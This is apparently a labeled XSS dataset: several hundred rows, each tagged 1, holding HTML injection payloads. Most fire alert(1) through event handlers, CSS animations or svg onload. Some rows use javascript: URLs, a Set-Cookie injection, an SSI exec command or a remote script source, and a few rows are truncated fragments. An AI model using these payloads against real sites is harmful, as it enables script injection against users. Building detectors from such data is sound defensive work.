1,< tt onpointerenter = alert ( 1 ) > XSS < /tt >
1,"< option onkeyup = ""alert ( 1 ) "" contenteditable > test < /option >"
1,"< section onkeyup = ""alert ( 1 ) "" contenteditable > test < /section >"
1,"< plaintext draggable = ""true"" ondrag = ""alert ( 1 ) "" > test < /plaintext >"
1,"< style > :target {color: red ; } < /style > < param id = x style = ""transition:color 10s"" ontransitioncancel = alert ( 1 ) > < /param >"
1,< output onpointerout = alert ( 1 ) > XSS < /output >
1,"< blockquote onmouseout = ""alert ( 1 ) "" > test < /blockquote >"
1,< element id = x tabindex = 1 onbeforeactivate = alert ( 1 ) > < /element >
1,"< style > :target {transform: rotate ( 180deg ) ; } < /style > < a id = x style = ""transition:transform 2s"" ontransitionrun = alert ( 1 ) > < /a >"
1,< time onpointerover = alert ( 1 ) > XSS < /time >
1,"< head onmouseleave = ""alert ( 1 ) "" > test < /head >"
1,"< content onbeforecopy = ""alert ( 1 ) "" contenteditable > test < /content >"
1,"< listing onmousemove = ""alert ( 1 ) "" > test < /listing >"
1,< input2 onpointerenter = alert ( 1 ) > XSS < /input2 >
1,x000003C
1,"< small ondblclick = ""alert ( 1 ) "" > test < /small >"
1,< i onpointerover = alert ( 1 ) > XSS < /i >
1,"< basefont draggable = ""true"" ondrag = ""alert ( 1 ) "" > test < /basefont >"
1,"< style > @keyframes x{} < /style > < basefont style = ""animation-name:x"" onanimationstart = ""alert ( 1 ) "" > < /basefont >"
1,< svg > < abbr onload = alert ( 1 ) > < /abbr >
1,< noframes onfocusout = alert ( 1 ) tabindex = 1 id = x > < /noframes > < input autofocus >
1,< meter onpointerout = alert ( 1 ) > XSS < /meter >
1,< link onpointermove = alert ( 1 ) > XSS < /link >
1,< option id = x tabindex = 1 onactivate = alert ( 1 ) > < /option >
1,"< applet oncopy = ""alert ( 1 ) "" contenteditable > test < /applet >"
1,< svg > < animatetransform onend = alert ( 1 ) attributeName = transform dur = 1s >
1,"< a onmouseout = ""alert ( 1 ) "" > test < /a >"
1,"< style > @keyframes slidein {} < /style > < br style = ""animation-duration:1s ; animation-name:slidein ; animation-iteration-count:2"" onanimationiteration = ""alert ( 1 ) "" > < /br >"
1,"< A HREF = ""http://0102.0146.0007.00000223/"" > < /A >"
1,"< style > :target {color:red ; } < /style > < fieldset id = x style = ""transition:color 1s"" ontransitionend = alert ( 1 ) > < /fieldset >"
1,"< menu oncut = ""alert ( 1 ) "" contenteditable > test < /menu >"
1,"< base onkeypress = ""alert ( 1 ) "" contenteditable > test < /base >"
1,< blockquote onpointerleave = alert ( 1 ) > XSS < /blockquote >
1,"< menu onmouseover = ""alert ( 1 ) "" > test < /menu >"
1,"< object draggable = ""true"" ondrag = ""alert ( 1 ) "" > test < /object >"
1,"< i oncopy = ""alert ( 1 ) "" contenteditable > test < /i >"
1,"< style > @keyframes x{} < /style > < bgsound style = ""animation-name:x"" onanimationstart = ""alert ( 1 ) "" > < /bgsound >"
1,< img2 onpointerleave = alert ( 1 ) > XSS < /img2 >
1,"< style > @keyframes x{from {left:0 ; }to {left: 1000px ; }}:target {animation:10s ease-in-out 0s 1 x ; } < /style > < wbr id = x style = ""position:absolute ; "" onanimationcancel = ""alert ( 1 ) "" > < /wbr >"
1,"< style > :target {color:red ; } < /style > < command id = x style = ""transition:color 1s"" ontransitionend = alert ( 1 ) > < /command >"
1,"< style > :target {color:red ; } < /style > < sub id = x style = ""transition:color 1s"" ontransitionend = alert ( 1 ) > < /sub >"
1,"< style > @keyframes slidein {} < /style > < input style = ""animation-duration:1s ; animation-name:slidein ; animation-iteration-count:2"" onanimationiteration = ""alert ( 1 ) "" > < /input >"
1,"< legend onkeyup = ""alert ( 1 ) "" contenteditable > test < /legend >"
1,"< thead onkeypress = ""alert ( 1 ) "" contenteditable > test < /thead >"
1,< link onpointerout = alert ( 1 ) > XSS < /link >
1,< summary onpointerout = alert ( 1 ) > XSS < /summary >
1,< input4 onpointerup = alert ( 1 ) > XSS < /input4 >
1,< svg > < details onload = alert ( 1 ) > < /details >
1,< acronym id = x tabindex = 1 onactivate = alert ( 1 ) > < /acronym >
1,"< select oncontextmenu = ""alert ( 1 ) "" > test < /select >"
1,"< bdi onmouseover = ""alert ( 1 ) "" > test < /bdi >"
1,< meter id = x tabindex = 1 onfocusin = alert ( 1 ) > < /meter >
1,< button id = x tabindex = 1 ondeactivate = alert ( 1 ) > < /button > < input id = y autofocus >
1,"< div draggable = ""true"" contenteditable > drag me < /div > < tt ondragover = alert ( 1 ) contenteditable > drop here < /tt >"
1,"< keygen draggable = ""true"" ondragenter = ""alert ( 1 ) "" > test < /keygen >"
1,"< div draggable = ""true"" contenteditable > drag me < /div > < rp ondragover = alert ( 1 ) contenteditable > drop here < /rp >"
1,"< video id = x controls onfocusin = alert ( 1 ) > < source src = ""validvideo.mp4"" type = video/mp4 > < /video >"
1,"< image onbeforepaste = ""alert ( 1 ) "" contenteditable > test < /image >"
1,"< output onbeforepaste = ""alert ( 1 ) "" contenteditable > test < /output >"
1,"< figcaption onbeforecut = ""alert ( 1 ) "" contenteditable > test < /figcaption >"
1,< s onpointermove = alert ( 1 ) > XSS < /s >
1,< slot id = x tabindex = 1 onbeforedeactivate = alert ( 1 ) > < /slot > < input autofocus >
1,< b id = x tabindex = 1 onactivate = alert ( 1 ) > < /b >
1,"< link onmousedown = ""alert ( 1 ) "" > test < /link >"
1,"< style > :target {transform: rotate ( 180deg ) ; } < /style > < multicol id = x style = ""transition:transform 2s"" ontransitionrun = alert ( 1 ) > < /multicol >"
1,"< frameset oncut = ""alert ( 1 ) "" contenteditable > test < /frameset >"
1,"< meter draggable = ""true"" ondragenter = ""alert ( 1 ) "" > test < /meter >"
1,< command onpointerdown = alert ( 1 ) > XSS < /command >
1,"< html onclick = ""alert ( 1 ) "" > test < /html >"
1,"< meta draggable = ""true"" ondragstart = ""alert ( 1 ) "" > test < /meta >"
1,< font onpointerover = alert ( 1 ) > XSS < /font >
1,"< template draggable = ""true"" ondragend = ""alert ( 1 ) "" > test < /template >"
1,< img2 onpointerdown = alert ( 1 ) > XSS < /img2 >
1,"< style > @keyframes x{} < /style > < del style = ""animation-name:x"" onanimationstart = ""alert ( 1 ) "" > < /del >"
1,"< image onkeyup = ""alert ( 1 ) "" contenteditable > test < /image >"
1,"< textarea onkeydown = ""alert ( 1 ) "" contenteditable > test < /textarea >"
1,< bdo id = x tabindex = 1 onbeforeactivate = alert ( 1 ) > < /bdo >
1,< kbd onpointerup = alert ( 1 ) > XSS < /kbd >
1,"< element onclick = ""alert ( 1 ) "" > test < /element >"
1,"< style > @keyframes x{} < /style > < tbody style = ""animation-name:x"" onanimationstart = ""alert ( 1 ) "" > < /tbody >"
1,"< style > @keyframes x{from {left:0 ; }to {left: 1000px ; }}:target {animation:10s ease-in-out 0s 1 x ; } < /style > < address id = x style = ""position:absolute ; "" onanimationcancel = ""alert ( 1 ) "" > < /address >"
1,"< meter onkeypress = ""alert ( 1 ) "" contenteditable > test < /meter >"
1,"< div draggable = ""true"" contenteditable > drag me < /div > < figcaption ondrop = alert ( 1 ) contenteditable > drop here < /figcaption >"
1,< sup id = x tabindex = 1 ondeactivate = alert ( 1 ) > < /sup > < input id = y autofocus >
1,"< cite onbeforecopy = ""alert ( 1 ) "" contenteditable > test < /cite >"
1,"< xmp draggable = ""true"" ondragend = ""alert ( 1 ) "" > test < /xmp >"
1,< svg > < applet onload = alert ( 1 ) > < /applet >
1,< details onpointerleave = alert ( 1 ) > XSS < /details >
1,< plaintext onblur = alert ( 1 ) tabindex = 1 id = x > < /plaintext > < input autofocus >
1,< frameset onpageshow = alert ( 1 ) >
1,< th onpointerdown = alert ( 1 ) > XSS < /th >
1,"< body onkeydown = ""alert ( 1 ) "" contenteditable > test < /body >"
1,"< style > :target {color:red ; } < /style > < html id = x style = ""transition:color 1s"" ontransitionend = alert ( 1 ) > < /html >"
1,< svg > < rt onload = alert ( 1 ) > < /rt >
1,< noframes id = x tabindex = 1 onbeforedeactivate = alert ( 1 ) > < /noframes > < input autofocus >
1,"< A HREF = ""http://google:ha.ckers.org"" > < /A >"
1,< bdi id = x tabindex = 1 onactivate = alert ( 1 ) > < /bdi >
1,< canvas onpointerleave = alert ( 1 ) > XSS < /canvas >
1,"< acronym onkeyup = ""alert ( 1 ) "" contenteditable > test < /acronym >"
1,"< strong onbeforecut = ""alert ( 1 ) "" contenteditable > test < /strong >"
1,"< style > :target {transform: rotate ( 180deg ) ; } < /style > < caption id = x style = ""transition:transform 2s"" ontransitionrun = alert ( 1 ) > < /caption >"
1,"< rtc ondblclick = ""alert ( 1 ) "" > test < /rtc >"
1,"< rt draggable = ""true"" ondrag = ""alert ( 1 ) "" > test < /rt >"
1,"< strike draggable = ""true"" ondragleave = ""alert ( 1 ) "" > test < /strike >"
1,< aside onpointerover = alert ( 1 ) > XSS < /aside >
1,"< style > @keyframes x{from {left:0 ; }to {left: 1000px ; }}:target {animation:10s ease-in-out 0s 1 x ; } < /style > < basefont id = x style = ""position:absolute ; "" onanimationcancel = ""alert ( 1 ) "" > < /basefont >"
1,"< style > @keyframes x{} < /style > < td style = ""animation-name:x"" onanimationstart = ""alert ( 1 ) "" > < /td >"
1,"< style > @keyframes x{} < /style > < address style = ""animation-name:x"" onanimationstart = ""alert ( 1 ) "" > < /address >"
1,< picture onpointerdown = alert ( 1 ) > XSS < /picture >
1,< bdi id = x tabindex = 1 onfocusin = alert ( 1 ) > < /bdi >
1,"< object draggable = ""true"" ondragend = ""alert ( 1 ) "" > test < /object >"
1,"< mark draggable = ""true"" ondragend = ""alert ( 1 ) "" > test < /mark >"
1,"< time onmouseout = ""alert ( 1 ) "" > test < /time >"
1,"< q onpaste = ""alert ( 1 ) "" contenteditable > test < /q >"
1,"< rtc draggable = ""true"" ondragstart = ""alert ( 1 ) "" > test < /rtc >"
1,"< param oncontextmenu = ""alert ( 1 ) "" > test < /param >"
1,"< q oncontextmenu = ""alert ( 1 ) "" > test < /q >"
1,< image3 onpointerup = alert ( 1 ) > XSS < /image3 >
1,< svg > < listing onload = alert ( 1 ) > < /listing >
1,"< base oncopy = ""alert ( 1 ) "" contenteditable > test < /base >"
1,"< STYLE type = ""text/css"" > BODY{background:url ( ""javascript:alert ( '' ) "" ) } < /STYLE >"
1,"< caption oncut = ""alert ( 1 ) "" contenteditable > test < /caption >"
1,"< data onmousedown = ""alert ( 1 ) "" > test < /data >"
1,< input2 onpointermove = alert ( 1 ) > XSS < /input2 >
1,< caption id = x tabindex = 1 onfocus = alert ( 1 ) > < /caption >
1,"< track onkeypress = ""alert ( 1 ) "" contenteditable > test < /track >"
1,"< bdi draggable = ""true"" ondragenter = ""alert ( 1 ) "" > test < /bdi >"
1,"< tbody onbeforecut = ""alert ( 1 ) "" contenteditable > test < /tbody >"
1,< h1 id = x tabindex = 1 ondeactivate = alert ( 1 ) > < /h1 > < input id = y autofocus >
1,"< style > :target {transform: rotate ( 180deg ) ; } < /style > < hgroup id = x style = ""transition:transform 2s"" ontransitionrun = alert ( 1 ) > < /hgroup >"
1,< section onpointerleave = alert ( 1 ) > XSS < /section >
1,"< address onpaste = ""alert ( 1 ) "" contenteditable > test < /address >"
1,"< li draggable = ""true"" ondragstart = ""alert ( 1 ) "" > test < /li >"
1,"< section onmouseup = ""alert ( 1 ) "" > test < /section >"
1,"< menuitem onpaste = ""alert ( 1 ) "" contenteditable > test < /menuitem >"
1,"< footer draggable = ""true"" ondragleave = ""alert ( 1 ) "" > test < /footer >"
1,"< button oncontextmenu = ""alert ( 1 ) "" > test < /button >"
1,"< dl oncopy = ""alert ( 1 ) "" contenteditable > test < /dl >"
1,"< figure ondblclick = ""alert ( 1 ) "" > test < /figure >"
1,"< div draggable = ""true"" contenteditable > drag me < /div > < big ondragover = alert ( 1 ) contenteditable > drop here < /big >"
1,< listing onfocusout = alert ( 1 ) tabindex = 1 id = x > < /listing > < input autofocus >
1,"< style > :target {color:red ; } < /style > < area id = x style = ""transition:color 1s"" ontransitionend = alert ( 1 ) > < /area >"
1,"< abbr onclick = ""alert ( 1 ) "" > test < /abbr >"
1,"< content ondblclick = ""alert ( 1 ) "" > test < /content >"
1,"< style > :target {color:red ; } < /style > < param id = x style = ""transition:color 1s"" ontransitionend = alert ( 1 ) > < /param >"
1,"< main oncut = ""alert ( 1 ) "" contenteditable > test < /main >"
1,< iframe onpointerup = alert ( 1 ) > XSS < /iframe >
1,< canvas id = x tabindex = 1 onactivate = alert ( 1 ) > < /canvas >
1,"< style > @keyframes x{} < /style > < datalist style = ""animation-name:x"" onanimationend = ""alert ( 1 ) "" > < /datalist >"
1,"< BODY BACKGROUND = ""javascript:alert ( '' ) "" >"
1,"< area onpaste = ""alert ( 1 ) "" contenteditable > test < /area >"
1,"< div draggable = ""true"" contenteditable > drag me < /div > < s ondrop = alert ( 1 ) contenteditable > drop here < /s >"
1,"< image onbeforecopy = ""alert ( 1 ) "" contenteditable > test < /image >"
1,"= ""javascript:alert ( '' )"
1,< head onpointerenter = alert ( 1 ) > XSS < /head >
1,"< nav onkeypress = ""alert ( 1 ) "" contenteditable > test < /nav >"
1,< fieldset onpointerout = alert ( 1 ) > XSS < /fieldset >
1,"< samp onpaste = ""alert ( 1 ) "" contenteditable > test < /samp >"
1,< hr id = x tabindex = 1 onbeforeactivate = alert ( 1 ) > < /hr >
1,"< style > :target {color:red ; } < /style > < legend id = x style = ""transition:color 1s"" ontransitionend = alert ( 1 ) > < /legend >"
1,"< style > @keyframes slidein {} < /style > < a style = ""animation-duration:1s ; animation-name:slidein ; animation-iteration-count:2"" onanimationiteration = ""alert ( 1 ) "" > < /a >"
1,"< style > :target {transform: rotate ( 180deg ) ; } < /style > < p id = x style = ""transition:transform 2s"" ontransitionrun = alert ( 1 ) > < /p >"
1,setTimeout (
1,"< basefont draggable = ""true"" ondragend = ""alert ( 1 ) "" > test < /basefont >"
1,"< colgroup onbeforepaste = ""alert ( 1 ) "" contenteditable > test < /colgroup >"
1,< rb id = x tabindex = 1 onfocus = alert ( 1 ) > < /rb >
1,< body onload = alert ( 1 ) >
1,< link onpointerleave = alert ( 1 ) > XSS < /link >
1,"< meter onmousedown = ""alert ( 1 ) "" > test < /meter >"
1,"< div onbeforepaste = ""alert ( 1 ) "" contenteditable > test < /div >"
1,< a onpointerover = alert ( 1 ) > XSS < /a >
1,< element id = x tabindex = 1 ondeactivate = alert ( 1 ) > < /element > < input id = y autofocus >
1,"< style > :target {transform: rotate ( 180deg ) ; } < /style > < html id = x style = ""transition:transform 2s"" ontransitionrun = alert ( 1 ) > < /html >"
1,"< textarea draggable = ""true"" ondragleave = ""alert ( 1 ) "" > test < /textarea >"
1,"< mark oncut = ""alert ( 1 ) "" contenteditable > test < /mark >"
1,"< legend onclick = ""alert ( 1 ) "" > test < /legend >"
1,"< style > @keyframes slidein {} < /style > < bgsound style = ""animation-duration:1s ; animation-name:slidein ; animation-iteration-count:2"" onanimationiteration = ""alert ( 1 ) "" > < /bgsound >"
1,"< hgroup onbeforecopy = ""alert ( 1 ) "" contenteditable > test < /hgroup >"
1,"< tr oncontextmenu = ""alert ( 1 ) "" > test < /tr >"
1,"< div draggable = ""true"" contenteditable > drag me < /div > < sub ondragover = alert ( 1 ) contenteditable > drop here < /sub >"
1,< dt onblur = alert ( 1 ) tabindex = 1 id = x > < /dt > < input autofocus >
1,< details id = x tabindex = 1 onfocus = alert ( 1 ) > < /details >
1,"< strike ondblclick = ""alert ( 1 ) "" > test < /strike >"
1,"< ol onmousemove = ""alert ( 1 ) "" > test < /ol >"
1,"< style > :target {color:red ; } < /style > < acronym id = x style = ""transition:color 1s"" ontransitionend = alert ( 1 ) > < /acronym >"
1,"< keygen draggable = ""true"" ondrag = ""alert ( 1 ) "" > test < /keygen >"
1,< pre id = x tabindex = 1 onactivate = alert ( 1 ) > < /pre >
1,< noframes id = x tabindex = 1 onactivate = alert ( 1 ) > < /noframes >
1,< p id = x tabindex = 1 onbeforedeactivate = alert ( 1 ) > < /p > < input autofocus >
1,"< abbr oncopy = ""alert ( 1 ) "" contenteditable > test < /abbr >"
1,"< style > @keyframes x{} < /style > < image style = ""animation-name:x"" onanimationend = ""alert ( 1 ) "" > < /image >"
1,"< sup onkeyup = ""alert ( 1 ) "" contenteditable > test < /sup >"
1,"< footer onbeforecopy = ""alert ( 1 ) "" contenteditable > test < /footer >"
1,"< div draggable = ""true"" contenteditable > drag me < /div > < code ondragover = alert ( 1 ) contenteditable > drop here < /code >"
1,"< frameset oncontextmenu = ""alert ( 1 ) "" > test < /frameset >"
1,< dl id = x tabindex = 1 onbeforeactivate = alert ( 1 ) > < /dl >
1,"< pre onbeforecopy = ""alert ( 1 ) "" contenteditable > test < /pre >"
1,< svg > < rb onload = alert ( 1 ) > < /rb >
1,< option id = x tabindex = 1 onfocus = alert ( 1 ) > < /option >
1,"< table onbeforecut = ""alert ( 1 ) "" contenteditable > test < /table >"
1,"< tfoot oncontextmenu = ""alert ( 1 ) "" > test < /tfoot >"
1,< svg > < noembed onload = alert ( 1 ) > < /noembed >
1,"< SCRIPT/SRC = ""http://.rocks/.js"" > < /SCRIPT >"
1,< base id = x tabindex = 1 onbeforedeactivate = alert ( 1 ) > < /base > < input autofocus >
1,"< hgroup onmouseover = ""alert ( 1 ) "" > test < /hgroup >"
1,"< big onbeforepaste = ""alert ( 1 ) "" contenteditable > test < /big >"
1,"< object oncopy = ""alert ( 1 ) "" contenteditable > test < /object >"
1,"< td draggable = ""true"" ondragleave = ""alert ( 1 ) "" > test < /td >"
1,"< s onkeypress = ""alert ( 1 ) "" contenteditable > test < /s >"
1,"< source onbeforecut = ""alert ( 1 ) "" contenteditable > test < /source >"
1,< script id = x tabindex = 1 onactivate = alert ( 1 ) > < /script >
1,"< details onkeyup = ""alert ( 1 ) "" contenteditable > test < /details >"
1,< noscript id = x tabindex = 1 onfocus = alert ( 1 ) > < /noscript >
1,"< abbr onkeyup = ""alert ( 1 ) "" contenteditable > test < /abbr >"
1,"< nextid onbeforepaste = ""alert ( 1 ) "" contenteditable > test < /nextid >"
1,< figure id = x tabindex = 1 onbeforedeactivate = alert ( 1 ) > < /figure > < input autofocus >
1,"< blink onkeydown = ""alert ( 1 ) "" contenteditable > test < /blink >"
1,"< video onmousemove = ""alert ( 1 ) "" > test < /video >"
1,"< noembed oncontextmenu = ""alert ( 1 ) "" > test < /noembed >"
1,"< div draggable = ""true"" contenteditable > drag me < /div > < hr ondragover = alert ( 1 ) contenteditable > drop here < /hr >"
1,< table id = x tabindex = 1 onfocusin = alert ( 1 ) > < /table >
1,"< dfn onpaste = ""alert ( 1 ) "" contenteditable > test < /dfn >"
1,"< command onmousemove = ""alert ( 1 ) "" > test < /command >"
1,"< noembed draggable = ""true"" ondragstart = ""alert ( 1 ) "" > test < /noembed >"
1,< br onfocusout = alert ( 1 ) tabindex = 1 id = x > < /br > < input autofocus >
1,< fieldset onpointerup = alert ( 1 ) > XSS < /fieldset >
1,< ruby onfocusout = alert ( 1 ) tabindex = 1 id = x > < /ruby > < input autofocus >
1,"< style > :target {color:red ; } < /style > < hr id = x style = ""transition:color 1s"" ontransitionend = alert ( 1 ) > < /hr >"
1,"< section onmousemove = ""alert ( 1 ) "" > test < /section >"
1,"< noembed onmousemove = ""alert ( 1 ) "" > test < /noembed >"
1,"< section draggable = ""true"" ondrag = ""alert ( 1 ) "" > test < /section >"
1,"< div draggable = ""true"" contenteditable > drag me < /div > < article ondrop = alert ( 1 ) contenteditable > drop here < /article >"
1,"RC = ""data:image/svg+xml ; base64 , PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg = = "" type = ""image/svg+xml"" AllowScriptAccess = ""always"""
1,< hgroup onpointermove = alert ( 1 ) > XSS < /hgroup >
1,"< ruby oncontextmenu = ""alert ( 1 ) "" > test < /ruby >"
1,"< map draggable = ""true"" ondrag = ""alert ( 1 ) "" > test < /map >"
1,"< tt draggable = ""true"" ondragenter = ""alert ( 1 ) "" > test < /tt >"
1,"< style > @keyframes x{} < /style > < dt style = ""animation-name:x"" onanimationend = ""alert ( 1 ) "" > < /dt >"
1,< meta onpointerover = alert ( 1 ) > XSS < /meta >
1,"< style > @keyframes slidein {} < /style > < thead style = ""animation-duration:1s ; animation-name:slidein ; animation-iteration-count:2"" onanimationiteration = ""alert ( 1 ) "" > < /thead >"
1,"< tr oncut = ""alert ( 1 ) "" contenteditable > test < /tr >"
1,< hr id = x tabindex = 1 onfocusin = alert ( 1 ) > < /hr >
1,"< content onpaste = ""alert ( 1 ) "" contenteditable > test < /content >"
1,"< s oncontextmenu = ""alert ( 1 ) "" > test < /s >"
1,< head onpointerleave = alert ( 1 ) > XSS < /head >
1,"< style > @keyframes x{} < /style > < style style = ""animation-name:x"" onanimationend = ""alert ( 1 ) "" > < /style >"
1,< figcaption id = x tabindex = 1 onbeforedeactivate = alert ( 1 ) > < /figcaption > < input autofocus >
1,< svg > < pre onload = alert ( 1 ) > < /pre >
1,"< figure oncopy = ""alert ( 1 ) "" contenteditable > test < /figure >"
1,"< style > :target {color:red ; } < /style > < dd id = x style = ""transition:color 1s"" ontransitionend = alert ( 1 ) > < /dd >"
1,"< rp oncut = ""alert ( 1 ) "" contenteditable > test < /rp >"
1,"< address onmousemove = ""alert ( 1 ) "" > test < /address >"
1,< ol id = x tabindex = 1 onbeforedeactivate = alert ( 1 ) > < /ol > < input autofocus >
1,"< META HTTP-EQUIV = ""Set-Cookie"" Content = ""USERID = < SCRIPT > alert ( '' ) < /SCRIPT > "" >"
1,< header onpointerover = alert ( 1 ) > XSS < /header >
1,"< strike onbeforepaste = ""alert ( 1 ) "" contenteditable > test < /strike >"
1,"< image onkeypress = ""alert ( 1 ) "" contenteditable > test < /image >"
1,"< input/onmouseover = ""javaSCRIPT&colon ; confirm&lpar ; 1&rpar ; """
1,"< pre draggable = ""true"" ondrag = ""alert ( 1 ) "" > test < /pre >"
1,"< style > :target {color: red ; } < /style > < head id = x style = ""transition:color 10s"" ontransitioncancel = alert ( 1 ) > < /head >"
1,"< style > :target {color: red ; } < /style > < article id = x style = ""transition:color 10s"" ontransitioncancel = alert ( 1 ) > < /article >"
1,"< basefont onbeforecopy = ""alert ( 1 ) "" contenteditable > test < /basefont >"
1,"META HTTP-EQUIV = ""Set-Cookie"" Content = ""USERID = < SCRIPT > alert ( '' ) < /SCRIPT > "" >"
1,"< style > @keyframes slidein {} < /style > < sup style = ""animation-duration:1s ; animation-name:slidein ; animation-iteration-count:2"" onanimationiteration = ""alert ( 1 ) "" > < /sup >"
1,"< canvas oncontextmenu = ""alert ( 1 ) "" > test < /canvas >"
1,"< nobr draggable = ""true"" ondragstart = ""alert ( 1 ) "" > test < /nobr >"
1,"< dt onmouseenter = ""alert ( 1 ) "" > test < /dt >"
1,< map onpointerleave = alert ( 1 ) > XSS < /map >
1,"< style > @keyframes x{from {left:0 ; }to {left: 1000px ; }}:target {animation:10s ease-in-out 0s 1 x ; } < /style > < em id = x style = ""position:absolute ; "" onanimationcancel = ""alert ( 1 ) "" > < /em >"
1,"< dfn onbeforecut = ""alert ( 1 ) "" contenteditable > test < /dfn >"
1,"< menu draggable = ""true"" ondragleave = ""alert ( 1 ) "" > test < /menu >"
1,"< !--#exec cmd = ""/bin/echo ' < SCR'""-- >"
1,"< style > :target {color:red ; } < /style > < menu id = x style = ""transition:color 1s"" ontransitionend = alert ( 1 ) > < /menu >"
1,"< optgroup onkeypress = ""alert ( 1 ) "" contenteditable > test < /optgroup >"
1,"< style > @keyframes x{} < /style > < cite style = ""animation-name:x"" onanimationend = ""alert ( 1 ) "" > < /cite >"
1,"< h1 onkeydown = ""alert ( 1 ) "" contenteditable > test < /h1 >"
1,"< style > @keyframes x{} < /style > < dfn style = ""animation-name:x"" onanimationend = ""alert ( 1 ) "" > < /dfn >"
1,< ins onpointerout = alert ( 1 ) > XSS < /ins >
1,< kbd id = x tabindex = 1 ondeactivate = alert ( 1 ) > < /kbd > < input id = y autofocus >
1,"< map onbeforecopy = ""alert ( 1 ) "" contenteditable > test < /map >"
1,< th onpointerup = alert ( 1 ) > XSS < /th >
1,"< style > :target {color: red ; } < /style > < cite id = x style = ""transition:color 10s"" ontransitioncancel = alert ( 1 ) > < /cite >"
1,< q onpointerup = alert ( 1 ) > XSS < /q >
1,< legend id = x tabindex = 1 onbeforeactivate = alert ( 1 ) > < /legend >
1,"< param onmouseenter = ""alert ( 1 ) "" > test < /param >"
1,"< style > @keyframes slidein {} < /style > < body style = ""animation-duration:1s ; animation-name:slidein ; animation-iteration-count:2"" onanimationiteration = ""alert ( 1 ) "" > < /body >"
1,< svg > < meter onload = alert ( 1 ) > < /meter >
1,"< style > @keyframes x{from {left:0 ; }to {left: 1000px ; }}:target {animation:10s ease-in-out 0s 1 x ; } < /style > < dl id = x style = ""position:absolute ; "" onanimationcancel = ""alert ( 1 ) "" > < /dl >"
1,< input onpointerover = alert ( 1 ) > XSS < /input >
1,"< col onmousemove = ""alert ( 1 ) "" > test < /col >"
1,"< ol onkeydown = ""alert ( 1 ) "" contenteditable > test < /ol >"
1,"< li onkeyup = ""alert ( 1 ) "" contenteditable > test < /li >"
1,< rt onblur = alert ( 1 ) tabindex = 1 id = x > < /rt > < input autofocus >
1,< title onpointerout = alert ( 1 ) > XSS < /title >
1,< nobr onpointerout = alert ( 1 ) > XSS < /nobr >
1,< bdi id = x tabindex = 1 ondeactivate = alert ( 1 ) > < /bdi > < input id = y autofocus >
1,"< div draggable = ""true"" contenteditable > drag me < /div > < wbr ondragover = alert ( 1 ) contenteditable > drop here < /wbr >"
1,"< canvas onmouseenter = ""alert ( 1 ) "" > test < /canvas >"
1,< address onpointerout = alert ( 1 ) > XSS < /address >
1,"< p onmouseleave = ""alert ( 1 ) "" > test < /p >"
1,"< multicol oncontextmenu = ""alert ( 1 ) "" > test < /multicol >"
1,"< bdo draggable = ""true"" ondragend = ""alert ( 1 ) "" > test < /bdo >"
1,"< th draggable = ""true"" ondragstart = ""alert ( 1 ) "" > test < /th >"
1,< legend onpointermove = alert ( 1 ) > XSS < /legend >
1,"< dir onmouseenter = ""alert ( 1 ) "" > test < /dir >"
1,< optgroup id = x tabindex = 1 onfocus = alert ( 1 ) > < /optgroup >
1,< dd onpointermove = alert ( 1 ) > XSS < /dd >
1,< style onblur = alert ( 1 ) tabindex = 1 id = x > < /style > < input autofocus >
1,< applet id = x tabindex = 1 onfocus = alert ( 1 ) > < /applet >
1,"< summary onkeypress = ""alert ( 1 ) "" contenteditable > test < /summary >"
1,"< ul onmouseout = ""alert ( 1 ) "" > test < /ul >"
1,"< blockquote draggable = ""true"" ondrag = ""alert ( 1 ) "" > test < /blockquote >"
1,"< keygen draggable = ""true"" ondragstart = ""alert ( 1 ) "" > test < /keygen >"
1,"< aside ondblclick = ""alert ( 1 ) "" > test < /aside >"
1,"< bgsound onbeforepaste = ""alert ( 1 ) "" contenteditable > test < /bgsound >"
1,"< ul onmouseover = ""alert ( 1 ) "" > test < /ul >"
1,"< summary onbeforecopy = ""alert ( 1 ) "" contenteditable > test < /summary >"
1,"< xmp onkeypress = ""alert ( 1 ) "" contenteditable > test < /xmp >"
